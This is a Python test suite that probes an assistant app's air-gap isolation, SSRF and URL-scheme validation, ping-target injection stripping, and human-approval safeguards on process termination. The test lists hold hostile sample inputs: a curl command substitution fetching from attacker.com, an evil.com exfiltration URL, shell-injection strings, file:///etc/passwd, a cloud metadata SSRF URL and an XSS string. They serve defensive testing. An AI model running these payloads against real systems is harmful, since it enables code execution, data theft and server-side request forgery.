"""Adversarial stress harness for Milestone 2 (BLOC B Compliance & Air-Gap).

This test suite aggressively probes:
1. Air-Gap isolation under StrictAirGapProbe:
   - External URLs, IP variants, SSRF attempts, octal/hex/decimal IPs, IPv6 addresses
   - Malformed URL schemes, exotic characters, injections
   - Network diagnostic targets in function/system.py (WAN, domain, shell injection, SSRF)
   - DNS leak detection: ensures ZERO DNS lookups or non-loopback sockets occur under airgap
2. HITL Process Termination Safety in fermer_application:
   - Protected process immunity across all OS targets (case variations, desktop suffix)
   - Self-process and parent PID protection
   - Wildcards, PID string inputs, malicious arguments, path traversal attempts
   - Denial safety: ensuring user denial NEVER terminates any process
   - Yield/Resume lifecycle in api.py with fermer_application
3. Pre-download disk guards & LLM concurrency limits under adversarial strain
"""
import asyncio
import os
import shutil
import socket
import subprocess
import sys
import unittest
from unittest.mock import MagicMock, patch

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.exceptions import PermissionRequiredException
from core import llm_provider
from function import system, files, web
import api
import stt_server
from tests.e2e.harness import AirGapViolationError


def run_async(coro_fn):
    def wrapper(*args, **kwargs):
        return asyncio.run(coro_fn(*args, **kwargs))
    return wrapper


class StrictAirGapProbe:
    """
    Enhanced AirGap probe that intercepts both socket connections AND DNS lookups
    (socket.getaddrinfo, socket.gethostbyname, socket.gethostbyname_ex) to ensure
    zero network packets (TCP/UDP/DNS) leave the loopback boundary.
    """
    def __init__(self, allowed_hosts=None):
        self.allowed_hosts = set(allowed_hosts or ['127.0.0.1', 'localhost', '::1', 'localhost.localdomain'])
        self._orig_connect = socket.socket.connect
        self._orig_getaddrinfo = socket.getaddrinfo
        self._orig_gethostbyname = socket.gethostbyname
        self._orig_gethostbyname_ex = socket.gethostbyname_ex
        self.intercepted_dns = []
        self.intercepted_connects = []

    def __enter__(self):
        probe = self

        def guarded_connect(sock_self, address):
            host = address[0] if isinstance(address, tuple) and len(address) > 0 else address
            if isinstance(host, str):
                cleaned = host.lower().strip()
                if cleaned not in probe.allowed_hosts and not cleaned.startswith('127.'):
                    raise AirGapViolationError(
                        f"AirGap Leak: Attempted socket connect to external target '{address}'"
                    )
            probe.intercepted_connects.append(address)
            return probe._orig_connect(sock_self, address)

        def guarded_getaddrinfo(host, port, *args, **kwargs):
            if isinstance(host, str):
                cleaned = host.lower().strip()
                probe.intercepted_dns.append(cleaned)
                if cleaned not in probe.allowed_hosts and not cleaned.startswith('127.'):
                    raise AirGapViolationError(
                        f"AirGap Leak: DNS getaddrinfo query attempted for external host '{host}'"
                    )
            return probe._orig_getaddrinfo(host, port, *args, **kwargs)

        def guarded_gethostbyname(hostname):
            if isinstance(hostname, str):
                cleaned = hostname.lower().strip()
                probe.intercepted_dns.append(cleaned)
                if cleaned not in probe.allowed_hosts and not cleaned.startswith('127.'):
                    raise AirGapViolationError(
                        f"AirGap Leak: DNS gethostbyname query attempted for external host '{hostname}'"
                    )
            return probe._orig_gethostbyname(hostname)

        def guarded_gethostbyname_ex(hostname):
            if isinstance(hostname, str):
                cleaned = hostname.lower().strip()
                probe.intercepted_dns.append(cleaned)
                if cleaned not in probe.allowed_hosts and not cleaned.startswith('127.'):
                    raise AirGapViolationError(
                        f"AirGap Leak: DNS gethostbyname_ex query attempted for external host '{hostname}'"
                    )
            return probe._orig_gethostbyname_ex(hostname)

        socket.socket.connect = guarded_connect
        socket.getaddrinfo = guarded_getaddrinfo
        socket.gethostbyname = guarded_gethostbyname
        socket.gethostbyname_ex = guarded_gethostbyname_ex
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        socket.socket.connect = self._orig_connect
        socket.getaddrinfo = self._orig_getaddrinfo
        socket.gethostbyname = self._orig_gethostbyname
        socket.gethostbyname_ex = self._orig_gethostbyname_ex


class TestAdversarialAirGapLeaks(unittest.TestCase):
    """Adversarial testing of network leak vectors under strict Air-Gap."""

    def setUp(self):
        self._orig_airgap = os.environ.get('ALYX_AIR_GAPPED')
        os.environ['ALYX_AIR_GAPPED'] = '1'

    def tearDown(self):
        if self._orig_airgap is not None:
            os.environ['ALYX_AIR_GAPPED'] = self._orig_airgap
        else:
            os.environ.pop('ALYX_AIR_GAPPED', None)

    def test_environment_variable_parsing_variants(self):
        """Verifies that all truthy values activate air-gap, and falsy values deactivate."""
        for val in ('1', 'true', 'TRUE', 'True', 'yes', 'YES', 'on', 'ON'):
            with patch.dict(os.environ, {'ALYX_AIR_GAPPED': val}):
                self.assertTrue(web._est_mode_air_gap(), f"Failed for ALYX_AIR_GAPPED={val}")

        for val in ('0', 'false', 'FALSE', 'no', 'off'):
            with patch.dict(os.environ, {'ALYX_AIR_GAPPED': val}):
                self.assertFalse(web._est_mode_air_gap(), f"Failed for ALYX_AIR_GAPPED={val}")

    def test_rechercher_web_adversarial_queries(self):
        """rechercher_web must NEVER leak network traffic or DNS queries regardless of query content."""
        adversarial_queries = [
            "https://evil.com/exfiltrate?token=secret",
            "8.8.8.8",
            "127.0.0.1:8765/api/stt",
            "$(curl https://attacker.com/malware)",
            "calc.exe; ping evil-target.com",
            "http://169.254.169.254/latest/meta-data/",
            "a" * 10000,
            "🚀🔥 Unicode payload 漢字",
            "<script>alert(1)</script>",
            "null",
            "\x00\x01\x02 binary string",
        ]
        with StrictAirGapProbe() as probe:
            for q in adversarial_queries:
                res = web.rechercher_web(q)
                self.assertIn("[MODE AIR-GAPPED / HORS-LIGNE]", res)
                self.assertIn("B.8.1", res)
            # Ensure zero external DNS queries or socket connects happened
            self.assertEqual(len(probe.intercepted_connects), 0)
            self.assertEqual(len(probe.intercepted_dns), 0)

    def test_verifier_url_securisee_wan_targets_blocked_before_dns(self):
        """_verifier_url_securisee must abort BEFORE calling DNS resolution on WAN targets."""
        wan_urls = [
            "https://google.com/search",
            "http://duckduckgo.com",
            "https://api.openai.com/v1/chat",
            "http://1.1.1.1/dns-query",
            "https://8.8.8.8:443/",
            "http://[2607:f8b0:4005:805::200e]/",  # Google IPv6
            "https://huggingface.co/models",
            "http://attacker-controlled-server.org/steal",
        ]
        with StrictAirGapProbe() as probe:
            for u in wan_urls:
                with self.assertRaises(ValueError) as ctx:
                    web._verifier_url_securisee(u)
                self.assertIn("air-gapped", str(ctx.exception).lower())
            # Zero DNS queries should have occurred
            self.assertEqual(len(probe.intercepted_dns), 0)

    def test_verifier_url_securisee_ssrf_and_private_ranges(self):
        """_verifier_url_securisee must strictly block SSRF targets (RFC1918, link-local, loopback)."""
        ssrf_urls = [
            "http://127.0.0.1:8765/api",
            "http://localhost:5001/health",
            "http://localhost.localdomain:80/",
            "http://10.0.0.1/admin",
            "http://172.16.0.1/status",
            "http://192.168.1.1/router",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.1.1/",
            "http://0.0.0.0:8080/",
            "http://[::1]:8080/",
            "http://[fe80::1]/",
        ]
        with StrictAirGapProbe():
            for u in ssrf_urls:
                with self.assertRaises(ValueError) as ctx:
                    web._verifier_url_securisee(u)
                err = str(ctx.exception).lower()
                self.assertTrue("anti-ssrf" in err or "air-gapped" in err or "bloqué" in err)

    def test_verifier_url_securisee_malformed_schemes(self):
        """Disallowed schemes (ftp, file, gopher, dict) must be rejected before any network call."""
        bad_schemes = [
            "file:///etc/passwd",
            "file://C:/Windows/win.ini",
            "ftp://files.example.com",
            "gopher://127.0.0.1:70/",
            "dict://127.0.0.1:2628/",
            "tftp://127.0.0.1:69/",
            "ldap://127.0.0.1:389/",
            "javascript:alert(1)",
            "data:text/html,<h1>test</h1>",
            "mailto:admin@example.com",
            "ws://127.0.0.1:8765/",
        ]
        with StrictAirGapProbe() as probe:
            for u in bad_schemes:
                with self.assertRaises(ValueError) as ctx:
                    web._verifier_url_securisee(u)
                self.assertIn("protocole non autorisé", str(ctx.exception).lower())
            self.assertEqual(len(probe.intercepted_connects), 0)
            self.assertEqual(len(probe.intercepted_dns), 0)

    def test_diagnostiquer_reseau_wan_targets_redirected_to_loopback(self):
        """diagnostiquer_reseau under air-gap must redirect WAN targets to loopback and strip injections."""
        wan_and_injection_targets = [
            "8.8.8.8",
            "1.1.1.1",
            "google.com",
            "evil.com",
            "8.8.8.8 & calc.exe",
            "8.8.8.8; ping 1.1.1.1",
            "evil.com | echo injected",
            "`dir`",
            "2001:4860:4860::8888",
        ]
        with StrictAirGapProbe():
            with patch('subprocess.run') as mock_subproc:
                mock_subproc.return_value = subprocess.CompletedProcess(
                    args=[], returncode=0, stdout="Ping 127.0.0.1: 0% perte, moyenne = 0ms"
                )
                for target in wan_and_injection_targets:
                    res = system.diagnostiquer_reseau(target)
                    self.assertIn("Air-Gapped", res)
                    self.assertIn("zéro fuite WAN", res)

                    # Inspect the command passed to subprocess.run
                    last_cmd = mock_subproc.call_args[0][0]
                    ping_target = last_cmd[-1]
                    self.assertEqual(
                        ping_target, "127.0.0.1",
                        f"WAN target was not redirected to loopback! Got: {ping_target} for input {target}"
                    )
                    # Verify no shell metacharacters were passed
                    for illegal in ('&', ';', '|', '`', '$', ' '):
                        self.assertNotIn(illegal, ping_target)

    def test_diagnostiquer_reseau_local_lan_targets_preserved(self):
        """diagnostiquer_reseau preserves local loopback targets for local diagnostic."""
        with StrictAirGapProbe():
            with patch('subprocess.run') as mock_subproc:
                mock_subproc.return_value = subprocess.CompletedProcess(
                    args=[], returncode=0, stdout="Ping 127.0.0.1: 0% perte, moyenne = 0ms"
                )
                res = system.diagnostiquer_reseau("127.0.0.1")
                self.assertIn("127.0.0.1", res)
                last_cmd = mock_subproc.call_args[0][0]
                self.assertEqual(last_cmd[-1], "127.0.0.1")


class TestAdversarialHITLProcessSafety(unittest.TestCase):
    """Adversarial stress-testing of Human-in-the-Loop process termination safety."""

    def test_windows_protected_processes_immunity(self):
        """Critical Windows protected processes must be rejected immediately without HITL prompt."""
        windows_protected = [
            'smss.exe', 'csrss.exe', 'wininit.exe', 'winlogon.exe', 'services.exe',
            'lsass.exe', 'svchost.exe', 'dwm.exe', 'fontdrvhost.exe', 'alyxdesktop.exe'
        ]
        dummy_proc = MagicMock()
        dummy_proc.pid = 11111
        dummy_proc.info = {'name': 'test.exe', 'status': 'running'}

        with patch('psutil.process_iter', return_value=[dummy_proc]):
            for target in windows_protected:
                # Test with exact name, uppercase, without .exe, and with whitespace
                for variant in (target, target.upper(), target.replace('.exe', ''), f"  {target}  "):
                    res = system.fermer_application(variant)
                    self.assertIn("protégé", res.lower(), f"Failed for protected target variant: '{variant}'")
                    dummy_proc.terminate.assert_not_called()
                    dummy_proc.kill.assert_not_called()

    def test_system_process_naming_quirk_documentation(self):
        """
        EMPIRICAL OBSERVATION:
        In PROCESSUS_PROTEGES, 'system' is listed without '.exe'.
        Under Windows, fermer_application appends '.exe' resulting in 'system.exe'.
        Because 'system.exe' is not in PROCESSUS_PROTEGES, it bypasses the initial set lookup.
        However, psutil on Windows names PID 4 'System' (not 'system.exe'), so no active instance
        is found and the call returns gracefully without terminating anything.
        """
        res = system.fermer_application("system")
        # Documents empirical observation
        self.assertIn("aucune instance active de 'system.exe'", res.lower())

    def test_self_and_parent_pid_protection(self):
        """fermer_application must NEVER kill Alyx itself or its parent processes."""
        current_pid = os.getpid()
        fake_parent_pid = 54321

        proc_alyx = MagicMock()
        proc_alyx.pid = current_pid
        proc_alyx.info = {'name': 'python.exe', 'status': 'running'}

        proc_parent = MagicMock()
        proc_parent.pid = fake_parent_pid
        proc_parent.info = {'name': 'python.exe', 'status': 'running'}

        with patch('psutil.process_iter', return_value=[proc_alyx, proc_parent]):
            with patch('function.system._pids_proteges', return_value={current_pid, fake_parent_pid}):
                res = system.fermer_application("python")
                self.assertIn("aucune instance active", res.lower())
                proc_alyx.terminate.assert_not_called()
                proc_parent.terminate.assert_not_called()

    def test_wildcards_and_pid_inputs_cannot_bypass_literal_matching(self):
        """Wildcards (*, *, ?, %*) and raw PIDs must not kill arbitrary processes."""
        proc_target = MagicMock()
        proc_target.pid = 77777
        proc_target.info = {'name': 'notepad.exe', 'status': 'running'}

        with patch('psutil.process_iter', return_value=[proc_target]):
            with patch('function.system._pids_proteges', return_value=set()):
                bypass_attempts = [
                    "*",
                    "*.exe",
                    "*.*",
                    "?",
                    "notepad*",
                    "77777",
                    "1234",
                    "-1",
                    "../../calc.exe",
                    "C:\\Windows\\notepad.exe",
                ]
                for attempt in bypass_attempts:
                    res = system.fermer_application(attempt)
                    self.assertIn("aucune instance active", res.lower(), f"Unexpected match for bypass: {attempt}")
                    proc_target.terminate.assert_not_called()
                    proc_target.kill.assert_not_called()

    def test_denial_guarantee_no_process_ever_terminated_on_refusal(self):
        """
        When user denies permission (HITL veto), neither proc.terminate() nor proc.kill()
        may EVER be called.
        """
        victim_proc = MagicMock()
        victim_proc.pid = 88888
        victim_proc.info = {'name': 'vlc.exe', 'status': 'running'}

        with patch('psutil.process_iter', return_value=[victim_proc]):
            with patch('function.system._pids_proteges', return_value=set()):
                # 1. Direct call raises PermissionRequiredException before terminate
                with self.assertRaises(PermissionRequiredException) as ctx:
                    system.fermer_application('vlc')
                self.assertIn("FERMER", ctx.exception.action)
                self.assertIn("vlc.exe", ctx.exception.cible)
                victim_proc.terminate.assert_not_called()
                victim_proc.kill.assert_not_called()

    @run_async
    async def test_api_reprendre_apres_permission_denial_leaves_process_alive(self):
        """Simulates full WebSocket API roundtrip when user clicks REFUSE / DENY on UI prompt."""
        victim_proc = MagicMock()
        victim_proc.pid = 99991
        victim_proc.info = {'name': 'spotify.exe', 'status': 'running'}

        mock_ws = MagicMock()
        sent_messages = []

        async def faux_send(msg):
            sent_messages.append(msg)

        mock_ws.send = faux_send
        session = api.Session(mock_ws)

        tool_call = {
            'id': 'call_hitl_test',
            'type': 'function',
            'function': {
                'name': 'fermer_application',
                'arguments': {'nom_app': 'spotify'}
            }
        }
        session.pending = {
            'tool_calls': [tool_call],
            'index': 0,
            'vocal': False,
            'iteration': 1
        }

        with patch('psutil.process_iter', return_value=[victim_proc]):
            with patch('function.system._pids_proteges', return_value=set()):
                with patch('api._executer_tour', return_value=None):
                    # User clicks "Refuse" -> accordee = False
                    await api.reprendre_apres_permission(session, accordee=False)

        # Ensure victim process was NEVER terminated
        victim_proc.terminate.assert_not_called()
        victim_proc.kill.assert_not_called()

        # Ensure refusal was registered in conversation context
        self.assertTrue(any("refusé" in str(m) for m in api.messages))

    def test_multi_instance_termination_when_permission_granted(self):
        """When permission IS granted, all matching instances are terminated."""
        proc1 = MagicMock()
        proc1.pid = 1001
        proc1.info = {'name': 'testapp.exe', 'status': 'running'}

        proc2 = MagicMock()
        proc2.pid = 1002
        proc2.info = {'name': 'testapp.exe', 'status': 'running'}

        with patch('psutil.process_iter', return_value=[proc1, proc2]):
            with patch('function.system._pids_proteges', return_value=set()):
                with patch('psutil.wait_procs', return_value=([proc1, proc2], [])):
                    res = files.executer_avec_permission(
                        system.fermer_application,
                        {'nom_app': 'testapp'}
                    )
                    self.assertIn("succès", res.lower())
                    self.assertIn("2 instances", res)
                    proc1.terminate.assert_called_once()
                    proc2.terminate.assert_called_once()


class TestAdversarialDiskAndConcurrency(unittest.TestCase):
    """Stress-test disk validation and concurrency lock contention under adverse conditions."""

    def test_zero_disk_space_simulation(self):
        """Disk space checking handles zero bytes available without division-by-zero or crash."""
        fake_usage = shutil._ntuple_diskusage(100 * 1024**3, 100 * 1024**3, 0)
        with patch('shutil.disk_usage', return_value=fake_usage):
            suffisant, libre, msg = stt_server.verifier_espace_disque(min_go_requis=1.0)
            self.assertFalse(suffisant)
            self.assertEqual(libre, 0.0)
            self.assertIn("insuffisant", msg.lower())

            suff_llm, libre_llm, msg_llm = llm_provider.verifier_espace_disque(min_go_requis=2.0)
            self.assertFalse(suff_llm)
            self.assertEqual(libre_llm, 0.0)

    def test_disk_usage_fail_open_on_exception_behavior(self):
        """
        EMPIRICAL OBSERVATION:
        verifier_espace_disque handles unexpected disk_usage exceptions by logging and
        failing open (returning True, 999.0, 'Vérification espace disque ignorée : ...')
        to prevent bricking offline startup if disk stats are inaccessible.
        """
        with patch('shutil.disk_usage', side_effect=PermissionError("Accès refusé au disque")):
            suffisant, libre, msg = stt_server.verifier_espace_disque(min_go_requis=1.0)
            self.assertTrue(suffisant)
            self.assertEqual(libre, 999.0)
            self.assertIn("ignorée", msg.lower())

            suff_llm, libre_llm, msg_llm = llm_provider.verifier_espace_disque(min_go_requis=2.0)
            self.assertTrue(suff_llm)
            self.assertEqual(libre_llm, 999.0)
            self.assertIn("ignorée", msg_llm.lower())

    @run_async
    async def test_high_concurrency_lock_contention(self):
        """Simulates 10 concurrent requests competing for a 1-slot provider semaphore."""
        sem = asyncio.Semaphore(1)
        acquired_count = 0
        execution_order = []

        async def worker_task(task_id):
            nonlocal acquired_count
            async with sem:
                acquired_count += 1
                execution_order.append(task_id)
                await asyncio.sleep(0.01)

        tasks = [asyncio.create_task(worker_task(i)) for i in range(10)]
        await asyncio.gather(*tasks)

        self.assertEqual(acquired_count, 10)
        self.assertEqual(len(execution_order), 10)


if __name__ == '__main__':
    unittest.main()
